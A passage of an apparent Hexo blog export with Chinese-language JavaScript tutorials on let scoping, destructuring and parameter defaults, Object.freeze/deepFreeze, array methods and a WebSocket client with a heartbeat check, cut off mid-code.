<h3 id="let語法宣告在區塊內的變數，就會綁定在區塊內，不受外部影響"><a href="#let語法宣告在區塊內的變數，就會綁定在區塊內，不受外部影響" class="headerlink" title="let語法宣告在區塊內的變數，就會綁定在區塊內，不受外部影響"></a>let語法宣告在區塊內的變數，就會綁定在區塊內，不受外部影響</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var tmp = 123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; // ReferenceError</span><br><span class="line">  <span class="built_in">let</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------</span><br><span class="line">typeof x; // ReferenceError</span><br><span class="line"><span class="built_in">let</span> x;</span><br><span class="line">-----------------------------------</span><br><span class="line">// no error</span><br><span class="line">var x = x;</span><br><span class="line"></span><br><span class="line">// error</span><br><span class="line"><span class="built_in">let</span> x = x;</span><br><span class="line">// ReferenceError: x is not defined</span><br></pre></td></tr></table></figure>

<h3 id="let語法不允許在同個區塊內，重複宣告"><a href="#let語法不允許在同個區塊內，重複宣告" class="headerlink" title="let語法不允許在同個區塊內，重複宣告"></a>let語法不允許在同個區塊內，重複宣告</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// error</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">  <span class="built_in">let</span> a = 10;</span><br><span class="line">  var a = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// error</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>() &#123;</span><br><span class="line">  <span class="built_in">let</span> a = 10;</span><br><span class="line">  <span class="built_in">let</span> a = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line"><span class="keyword">function</span> func(arg) &#123;</span><br><span class="line">  <span class="built_in">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">func() // error</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> func(arg) &#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">let</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func() // no error</span><br></pre></td></tr></table></figure>

<h3 id="ES6-let"><a href="#ES6-let" class="headerlink" title="ES6-let"></a>ES6-let</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f1</span></span>() &#123;</span><br><span class="line">  <span class="built_in">let</span> n = 5;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">let</span> n = 10;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(n); // 5</span><br><span class="line">&#125;</span><br><span class="line">-----------------------</span><br><span class="line">// IIFE 寫法</span><br><span class="line">(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">  var tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line">// ES6-寫法</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">let</span> tmp = ...;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="優先使用function-expression"><a href="#優先使用function-expression" class="headerlink" title="優先使用function expression"></a>優先使用function expression</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// 優先使用<span class="keyword">function</span> expression</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">let</span> a = <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line">  <span class="built_in">let</span> f = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">    <span class="built_in">return</span> a;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="有-就有區塊"><a href="#有-就有區塊" class="headerlink" title="有 { } 就有區塊"></a>有 { } 就有區塊</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// error</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) <span class="built_in">let</span> x = 1;</span><br><span class="line"></span><br><span class="line">// no error</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="built_in">let</span> x = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>let</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-variable 2nd</title>
    <url>/posts/d2c301af/</url>
    <content><![CDATA[<h2 id="JavaScript-ES6-variable-2nd"><a href="#JavaScript-ES6-variable-2nd" class="headerlink" title="JavaScript-ES6-variable 2nd"></a>JavaScript-ES6-variable 2nd</h2><span id="more"></span>
<p>這篇簡介JavaScript-ES6 variable destructuration default。</p>
<h2 id="variable-destructuration-defaultdestructuration-allow-default-value"><a href="#variable-destructuration-defaultdestructuration-allow-default-value" class="headerlink" title="variable destructuration defaultdestructuration allow default value:"></a>variable destructuration default<br>destructuration allow default value:</h2><p>let [foo &#x3D; true] &#x3D; [];<br>foo &#x2F;&#x2F; true</p>
<p>let [x, y &#x3D; ‘b’] &#x3D; [‘a’]; &#x2F;&#x2F; x&#x3D;’a’, y&#x3D;’b’<br>let [x, y &#x3D; ‘b’] &#x3D; [‘a’, undefined]; &#x2F;&#x2F; x&#x3D;’a’, y&#x3D;’b’</p>
<h2 id="ES6內部使用-x3D-x3D-x3D-來判斷值，當array內-x3D-x3D-x3D-undefined時才會使default-value生效"><a href="#ES6內部使用-x3D-x3D-x3D-來判斷值，當array內-x3D-x3D-x3D-undefined時才會使default-value生效" class="headerlink" title="ES6內部使用 &#x3D;&#x3D;&#x3D; 來判斷值，當array內 &#x3D;&#x3D;&#x3D; undefined時才會使default value生效"></a>ES6內部使用 &#x3D;&#x3D;&#x3D; 來判斷值，當array內 &#x3D;&#x3D;&#x3D; undefined時才會使default value生效</h2><p>let [x &#x3D; 1] &#x3D; [undefined];<br>x &#x2F;&#x2F; 1</p>
<h2 id="當assign-null時，因-x3D-x3D-x3D-undefined，default-value不生效"><a href="#當assign-null時，因-x3D-x3D-x3D-undefined，default-value不生效" class="headerlink" title="當assign null時，因 !&#x3D;&#x3D;&#x3D; undefined，default value不生效"></a>當assign null時，因 !&#x3D;&#x3D;&#x3D; undefined，default value不生效</h2><p>let [x &#x3D; 1] &#x3D; [null];<br>x &#x2F;&#x2F; null</p>
<h2 id="這個例子因x有default-value，所以f-不會執行"><a href="#這個例子因x有default-value，所以f-不會執行" class="headerlink" title="這個例子因x有default value，所以f()不會執行"></a>這個例子因x有default value，所以f()不會執行</h2><p>function f() {<br>  console.log(‘aaa’);<br>}</p>
<p>let [x &#x3D; f()] &#x3D; [1];</p>
<h2 id="上例等於下方code"><a href="#上例等於下方code" class="headerlink" title="上例等於下方code"></a>上例等於下方code</h2><p>let x;<br>if ([1][0] &#x3D;&#x3D;&#x3D; undefined) {<br>  x &#x3D; f();<br>} else {<br>  x &#x3D; [1][0];<br>}</p>
<h2 id="default-value可以引用variable，但該variable必須已assign-value"><a href="#default-value可以引用variable，但該variable必須已assign-value" class="headerlink" title="default value可以引用variable，但該variable必須已assign value:"></a>default value可以引用variable，但該variable必須已assign value:</h2><p>let [x &#x3D; 1, y &#x3D; x] &#x3D; [];     &#x2F;&#x2F; x&#x3D;1; y&#x3D;1<br>let [x &#x3D; 1, y &#x3D; x] &#x3D; [2];    &#x2F;&#x2F; x&#x3D;2; y&#x3D;2<br>let [x &#x3D; 1, y &#x3D; x] &#x3D; [1, 2]; &#x2F;&#x2F; x&#x3D;1; y&#x3D;2<br>let [x &#x3D; y, y &#x3D; 1] &#x3D; [];     &#x2F;&#x2F; ReferenceError: y is not defined  -&gt; variable y 還沒assign value 就給 x 當 default value</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>variable</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-ES6-function</title>
    <url>/posts/e42bd10/</url>
    <content><![CDATA[<h2 id="JavaScript-ES6-function"><a href="#JavaScript-ES6-function" class="headerlink" title="JavaScript-ES6-function"></a>JavaScript-ES6-function</h2><span id="more"></span>
<p>這篇簡介JavaScript-ES6-function。</p>
<h2 id="default-parameter-part-I"><a href="#default-parameter-part-I" class="headerlink" title="default parameter part I:"></a>default parameter part I:</h2><p>ES6 allow default parameter:</p>
<p>function log(x, y &#x3D; ‘World’) {<br>  console.log(x, y);<br>}</p>
<p>log(‘Hello’) &#x2F;&#x2F; Hello World<br>log(‘Hello’, ‘China’) &#x2F;&#x2F; Hello China<br>log(‘Hello’, ‘’) &#x2F;&#x2F; Hello</p>
<p>function Point(x &#x3D; 0, y &#x3D; 0) {<br>  this.x &#x3D; x;<br>  this.y &#x3D; y;<br>}</p>
<p>const p &#x3D; new Point();<br>p &#x2F;&#x2F; { x: 0, y: 0 }</p>
<h2 id="default-parameter-part-II"><a href="#default-parameter-part-II" class="headerlink" title="default parameter part II:"></a>default parameter part II:</h2><p>default parameter Cannot redeclare let or const:<br>function foo(x &#x3D; 5) {<br>  let x &#x3D; 1; &#x2F;&#x2F; error<br>  const x &#x3D; 2; &#x2F;&#x2F; error<br>}</p>
<p>default parameter<br>function Cannot have same parameter name:<br>&#x2F;&#x2F; non-error<br>function foo(x, x, y) {<br>  &#x2F;&#x2F; …<br>}</p>
<p>&#x2F;&#x2F; error<br>function foo(x, x, y &#x3D; 1) {<br>  &#x2F;&#x2F; …<br>}<br>&#x2F;&#x2F; SyntaxError: Duplicate parameter name not allowed in this context</p>
<h2 id="每次呼叫function時，default-parameter都會重新計算-x-1，不會使用上一次的default-parameter"><a href="#每次呼叫function時，default-parameter都會重新計算-x-1，不會使用上一次的default-parameter" class="headerlink" title="每次呼叫function時，default parameter都會重新計算 x + 1，不會使用上一次的default parameter"></a>每次呼叫function時，default parameter都會重新計算 x + 1，不會使用上一次的default parameter</h2><p>let x &#x3D; 99;<br>function foo(p &#x3D; x + 1) {<br>  console.log(p);<br>}</p>
<p>foo() &#x2F;&#x2F; 100</p>
<p>x &#x3D; 100;<br>foo() &#x2F;&#x2F; 101</p>
<h2 id="default-parameter-combine-ObjectDestructuration"><a href="#default-parameter-combine-ObjectDestructuration" class="headerlink" title="default parameter combine ObjectDestructuration:"></a>default parameter combine ObjectDestructuration:</h2><p>function foo({x, y &#x3D; 5}) {<br>  console.log(x, y);<br>}</p>
<p>foo({}) &#x2F;&#x2F; undefined 5<br>foo({x: 1}) &#x2F;&#x2F; 1 5<br>foo({x: 1, y: 2}) &#x2F;&#x2F; 1 2<br>foo() &#x2F;&#x2F; TypeError: Cannot read property ‘x’ of undefined</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-Object.freeze() &amp; deepFreeze()</title>
    <url>/posts/c5feb9d2/</url>
    <content><![CDATA[<h3 id="JavaScript-Object-Freeze-amp-deepFreeze"><a href="#JavaScript-Object-Freeze-amp-deepFreeze" class="headerlink" title="JavaScript-Object.Freeze() &amp; deepFreeze()"></a>JavaScript-Object.Freeze() &amp; deepFreeze()</h3><span id="more"></span>
<p>在 ES6 中，我們可以把變數宣告為常數const來使其不能被修改。<br>要阻止一個物件包含內部成員被修改可以視需求使用Object.freeze()或deepFreeze()來解決這個問題。</p>
<h3 id="使用Object-freeze來保護物件"><a href="#使用Object-freeze來保護物件" class="headerlink" title="使用Object.freeze來保護物件"></a>使用Object.freeze來保護物件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">const obj = &#123;</span><br><span class="line">    num: 10,</span><br><span class="line">    obj: &#123;</span><br><span class="line">        content: <span class="string">&quot;mutable object&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Object.freeze(obj);</span><br><span class="line">obj.num = 5;</span><br><span class="line">obj.obj = &#123; content: <span class="string">&quot;changed!&quot;</span> &#125;</span><br><span class="line"> </span><br><span class="line">console.log(obj);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&#123;</span><br><span class="line">    num: 10,</span><br><span class="line">    obj: &#123;</span><br><span class="line">        content: <span class="string">&quot;changed!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj.num不可更改，但obj.obj仍然可以被更改</span><br></pre></td></tr></table></figure>

<h3 id="MDN-提供-deepFreeze"><a href="#MDN-提供-deepFreeze" class="headerlink" title="MDN 提供 deepFreeze"></a>MDN 提供 deepFreeze</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> deepFreeze(object) &#123;</span><br><span class="line">  // Retrieve the property names defined on object</span><br><span class="line">  var propNames = Object.getOwnPropertyNames(object)</span><br><span class="line"></span><br><span class="line">  // Freeze properties before freezing self</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">let</span> name of propNames) &#123;</span><br><span class="line">    <span class="built_in">let</span> value = object[name]</span><br><span class="line"></span><br><span class="line">    object[name] =</span><br><span class="line">      value &amp;&amp; typeof value === <span class="string">&quot;object&quot;</span> ? deepFreeze(value) : value</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">return</span> Object.freeze(object)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input:</span><br><span class="line">const obj = &#123;</span><br><span class="line">    num: 10,</span><br><span class="line">    obj: &#123;</span><br><span class="line">        content: <span class="string">&quot;mutable object&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">deepFreeze(obj);</span><br><span class="line">obj.num = 5;</span><br><span class="line">obj.obj = &#123; content: <span class="string">&quot;changed!&quot;</span> &#125;</span><br><span class="line"> </span><br><span class="line">console.log(obj);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&#123;</span><br><span class="line">    num: 10,</span><br><span class="line">    obj: &#123;</span><br><span class="line">        content: <span class="string">&quot;mutable object&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Object</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-Intro Arrray.propotype methods</title>
    <url>/posts/6f8b9258/</url>
    <content><![CDATA[<h3 id="JavaScript-Intro-Arrray-propotype-methods"><a href="#JavaScript-Intro-Arrray-propotype-methods" class="headerlink" title="JavaScript-Intro Arrray.propotype methods"></a>JavaScript-Intro Arrray.propotype methods</h3><span id="more"></span>
<p>這篇介紹JavaScript-Intro Arrray.propotype methods。</p>
<h3 id="array-example"><a href="#array-example" class="headerlink" title="array example"></a>array example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var people = [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">&#x27;David&#x27;</span>,</span><br><span class="line">    like: <span class="string">&#x27;鍋燒意麵&#x27;</span>,</span><br><span class="line">    age: 18</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">&#x27;Mary&#x27;</span>,</span><br><span class="line">    like: <span class="string">&#x27;炒麵&#x27;</span>,</span><br><span class="line">    age: 24</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">&#x27;FeFe&#x27;</span>,</span><br><span class="line">    like: <span class="string">&#x27;蘿蔔泥&#x27;</span>,</span><br><span class="line">    age: 1</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">&#x27;Tona&#x27;</span>,</span><br><span class="line">    like: <span class="string">&#x27;蘿蔔泥&#x27;</span>,</span><br><span class="line">    age: 3</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-filter"><a href="#Array-prototype-filter" class="headerlink" title="Array.prototype.filter()"></a>Array.prototype.filter()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">filter() 會回傳一個陣列，其條件是 <span class="built_in">return</span> 條件式為 <span class="literal">true</span> 的物件，很適合用在搜尋符合條件的資料</span><br><span class="line">--------</span><br><span class="line">var filterEmpty = people.filter(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(filterEmpty);    // 沒有條件，會是一個空陣列</span><br><span class="line"></span><br><span class="line">var filterAgeThan5 = people.filter(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 5;       // 取得大於五歲的</span><br><span class="line">&#125;);</span><br><span class="line">console.log(filterAgeThan5); // David, Mary 這兩個物件</span><br><span class="line"></span><br><span class="line">var filterDouble = people.filter(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> index % 2 === 1;    // 取得陣列中雙數的物件</span><br><span class="line">&#125;);</span><br><span class="line">console.log(filterDouble);   // Mary, Tona 這兩個物件</span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-find"><a href="#Array-prototype-find" class="headerlink" title="Array.prototype.find()"></a>Array.prototype.find()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find() 與 filter() 很像，但 find() 只會回傳一次值，且是第一次為 <span class="literal">true</span> 的值。</span><br><span class="line">--------</span><br><span class="line">var findEmpty = people.find(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(findEmpty);          // 沒有條件，會是 undefined</span><br><span class="line"></span><br><span class="line">var findAgeThan5 = people.find(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 5;           // 取得大於五歲的</span><br><span class="line">&#125;);</span><br><span class="line">console.log(findAgeThan5);       // 雖然答案有兩個，但只會回傳 David 這一個物件</span><br><span class="line"></span><br><span class="line">var findLike = people.find(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.like === <span class="string">&#x27;蘿蔔泥&#x27;</span>;  // 取得陣列 like === <span class="string">&#x27;蘿蔔泥&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">console.log(findLike); </span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-forEach"><a href="#Array-prototype-forEach" class="headerlink" title="Array.prototype.forEach()"></a>Array.prototype.forEach()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">forEach 是這幾個陣列函式最單純的一個，不會額外回傳值，只單純執行每個陣列內的物件或值。</span><br><span class="line">--------</span><br><span class="line">var forEachIt = people.forEach(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  console.log(item, index, array); // 物件, 索引, 全部陣列</span><br><span class="line">  <span class="built_in">return</span> item;                     // forEach 沒在 <span class="built_in">return</span> 的，所以這邊寫了也沒用</span><br><span class="line">&#125;);</span><br><span class="line">console.log(forEachIt);            // undefined</span><br><span class="line"></span><br><span class="line">people.forEach(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  item.age = item.age + 1;         // forEach 就如同 <span class="keyword">for</span>，不過寫法更容易</span><br><span class="line">&#125;);</span><br><span class="line">console.log(people);  </span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-map"><a href="#Array-prototype-map" class="headerlink" title="Array.prototype.map()"></a>Array.prototype.map()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用 map() 時他需要回傳一個值，他會透過函式內所回傳的值組合成一個陣列。</span><br><span class="line">如果不回傳則是 undefined，回傳數量等於原始陣列的長度 -&gt; 適合將原始的變數運算後重新組合一個新的陣列。</span><br><span class="line">--------</span><br><span class="line">var mapEmpty = people.map(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(mapEmpty);    // [undefined, undefined, undefined, undefined]</span><br><span class="line"></span><br><span class="line">var mapAgeThan5 = people.map(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 5;    // 比較大於五歲的</span><br><span class="line">&#125;);</span><br><span class="line">console.log(mapAgeThan5); // [<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>]</span><br><span class="line"></span><br><span class="line">var mapAgeThan5_2 = people.map(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  // 錯誤示範</span><br><span class="line">  <span class="keyword">if</span> (item.age &gt; 5) &#123;</span><br><span class="line">    <span class="built_in">return</span> item;              // 回傳大於五歲的</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">false</span>;               // 別以為空的或是 <span class="literal">false</span> 就不會回傳</span><br><span class="line">&#125;);</span><br><span class="line">console.log(mapAgeThan5_2);   // [&#123;name: <span class="string">&#x27;David&#x27;</span>...&#125;, &#123;name: <span class="string">&#x27;Mary&#x27;</span>...&#125;, <span class="literal">false</span>, <span class="literal">false</span>]</span><br><span class="line"></span><br><span class="line">var mapEat = people.map(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="keyword">if</span> (item.like !== <span class="string">&#x27;蘿蔔泥&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> `<span class="variable">$&#123;item.like&#125;</span> 好吃`;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">return</span> `<span class="variable">$&#123;item.like&#125;</span> 不好吃`;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(mapEat);          // [<span class="string">&quot;鍋燒意麵 好吃&quot;</span>, <span class="string">&quot;炒麵 好吃&quot;</span>, <span class="string">&quot;蘿蔔泥 不好吃&quot;</span>, <span class="string">&quot;蘿蔔泥 不好吃&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-every"><a href="#Array-prototype-every" class="headerlink" title="Array.prototype.every()"></a>Array.prototype.every()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">every() 可以檢查所有的陣列是否符合條件，這僅會回傳一個值 <span class="literal">true</span> or <span class="literal">false</span>，可以用來檢查陣列中的內容是否符合特定條件。</span><br><span class="line">--------</span><br><span class="line">var ans = array.every(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  console.log(item, index, array); // 物件, 索引, 全部陣列</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 10 // 當全部 age 大於 10 才能回傳 <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">console.log(ans); // <span class="literal">false</span>: 只要有部分不符合，則為 <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">var ans2 = array.every(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &lt; 25</span><br><span class="line">&#125;);</span><br><span class="line">console.log(ans2); // <span class="literal">true</span>: 全部 age 都小於 25</span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-some"><a href="#Array-prototype-some" class="headerlink" title="Array.prototype.some()"></a>Array.prototype.some()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">some() 與 every()，都是回傳 <span class="literal">true</span> or <span class="literal">false</span>，差異僅在 every() 需完全符合，some() 僅需要部分符合。</span><br><span class="line">--------</span><br><span class="line">var ans = people.some(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 10 // 當全部 age 大於 10 才能回傳 <span class="literal">true</span></span><br><span class="line">&#125;);</span><br><span class="line">console.log(ans);  // <span class="literal">true</span>: 只要有部分符合，則為 <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">var ans2 = people.some(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &lt; 25</span><br><span class="line">&#125;);</span><br><span class="line">console.log(ans2); // <span class="literal">true</span>: 只要有部分符合，則為 <span class="literal">true</span>  </span><br><span class="line"></span><br><span class="line">var ans2 = people.some(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  <span class="built_in">return</span> item.age &gt; 25</span><br><span class="line">&#125;);</span><br><span class="line">console.log(ans2); // <span class="literal">false</span>: 全部都不符合則為 <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="Array-prototype-reduce"><a href="#Array-prototype-reduce" class="headerlink" title="Array.prototype.reduce()"></a>Array.prototype.reduce()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">與前一個回傳的值再次作運算，參數包含以下：</span><br><span class="line">accumulator: 前一個參數，如果是第一個陣列的話，值是以另外傳入或初始化的值</span><br><span class="line">currentValue: 當前變數</span><br><span class="line">currentIndex: 當前索引</span><br><span class="line">array: 全部陣列</span><br><span class="line">--------</span><br><span class="line">var reduceEmpty = people.reduce(<span class="keyword">function</span>(accumulator, currentValue, currentIndex, array)&#123;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(reduceEmpty);                 // 沒有條件，會是 undefined</span><br><span class="line"></span><br><span class="line">var reducePlus = people.reduce(<span class="keyword">function</span>(accumulator, currentValue, currentIndex, array)&#123;</span><br><span class="line">  // 分別為前一個回傳值, 目前值, 當前索引值</span><br><span class="line">  console.log(accumulator, currentValue, currentIndex);</span><br><span class="line">  <span class="built_in">return</span> accumulator + currentValue.age;  // 與前一個值相加</span><br><span class="line">&#125;, 0);                                    // 傳入初始化值為 0</span><br><span class="line">console.log(reducePlus);                  // 總和為 46</span><br><span class="line"></span><br><span class="line">var reducePlus = people.reduce(<span class="keyword">function</span>(accumulator, currentValue, currentIndex, array)&#123;</span><br><span class="line">  console.log(<span class="string">&#x27;reduce&#x27;</span>, accumulator, currentValue, currentIndex)</span><br><span class="line">  <span class="built_in">return</span> Math.max( accumulator, currentValue.age ); // 與前一個值比較哪個大</span><br><span class="line">&#125;, 0);</span><br><span class="line">console.log(reducePlus);                  // 最大值為 24</span><br></pre></td></tr></table></figure>

<h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">var ans3 = people.forEach(<span class="keyword">function</span>(item, index, array)&#123;</span><br><span class="line">  console.log(this) // 這邊的 this 就會使用後方傳入的</span><br><span class="line">  <span class="built_in">return</span> item.age &lt; 25</span><br><span class="line">&#125;, people);         // 傳入的物件，替代 this，如果無則是 window</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript-WebSocket</title>
    <url>/posts/233cfa74/</url>
    <content><![CDATA[<h2 id="JavaScript-WebSocket"><a href="#JavaScript-WebSocket" class="headerlink" title="JavaScript-WebSocket"></a>JavaScript-WebSocket</h2><span id="more"></span>
<p>這篇介紹JavaScript-WebSocket。</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h2><p>&#x2F;* global postAjax <em>&#x2F;<br>&#x2F;</em> global ObjectUtil <em>&#x2F;<br>&#x2F;</em> global $j *&#x2F;<br>&#x2F;&#x2F; eslint-disable-next-line no-var</p>
<p>var MobileWebSocket &#x3D; (function mobileWebSocket() {<br>    let webSocket &#x3D; null;<br>    let count &#x3D; 0;</p>
<hr>
<pre><code>const createWebSocket = () =&gt; &#123;
    if (ObjectUtil.isObject(webSocket)) &#123;
        return;
    &#125;
    postAjax(&#123;
        url: &quot;API Path&quot;,
        data: &#123;
        &#125;,
        success(response) &#123;
            if (response.status === &quot;200&quot;) &#123;
                if (&quot;WebSocket&quot; in window) &#123;
                    let tempWS = null;
                    if (window.location.protocol === &quot;https:&quot;) &#123;
                        tempWS = new WebSocket(&quot;wss://&quot; + window.location.hostname + response.path + &quot;?token=&quot; + response.token);
                    &#125; else &#123;
                        tempWS = new WebSocket(&quot;ws://&quot; + window.location.hostname + &quot;:&quot; + window.location.port + response.path + &quot;?token=&quot; + response.token);
                    &#125;
                    tempWS.onerror = () =&gt; &#123;
                        console.warn(&quot;WebSocket error&quot;);
                        if (ObjectUtil.isObject(webSocket)) &#123;
                            webSocket.close();
                        &#125;
                        webSocket = null;
                    &#125;;

                    tempWS.onopen = () =&gt; &#123;
                        heartCheck.start();
                        console.log(&quot;WebSocket connected&quot;);
                    &#125;;

                    tempWS.onmessage = (event) =&gt; &#123;
                        count = 0;
                        //Do something action
                    &#125;;

                    tempWS.onclose = () =&gt; &#123;
                        console.log(&quot;WebSocket closed&quot;);
                        if (ObjectUtil.isObject(webSocket)) &#123;
                            webSocket.close();
                        &#125;
                        webSocket = null;
                    &#125;;

                    webSocket = tempWS;
                    window.onbeforeunload = () =&gt; &#123;
                        try &#123;
                            webSocket.close();
                        &#125; catch (e) &#123;
                            // nothing to be done
                        &#125;
                    &#125;;
                &#125; else &#123;
                    console.log(&quot;webSocket is not supported&quot;);
                &#125;
            &#125;
        &#125;
    &#125;);
&#125;;
</code></pre>
<hr>
<pre><code>const heartCheck = &#123;
    heartbeatTimeout: 10000, // ms
    hearbeatTask: null,
    hearbeatContent: &quot;&#123;\&quot;router\&quot;:\&quot;heartbeat\&quot;&#125;&quot;,
    start() &#123;
        if (ObjectUtil.isObject(this.hearbeatTask)) &#123;
            clearInterval(this.hearbeatTask);
            this.hearbeatTask = null;
        &#125;
        this.hearbeatTask = setInterval(() =&gt; &#123;
            console.log(&quot;---beat:&quot; + new Date());
            try &#123;
                count += 1;
                if (webSocket === null) &#123;
                    count = 0;
                    createWebSocket();
                    return;
                &#125;
                if (count &gt;= 3) &#123;
                    count = 0;
                    if (ObjectUtil.isObject(webSocket)) &#123;
                        webSocket.close();
                    &#125;
                    webSocket = null;
                    return;
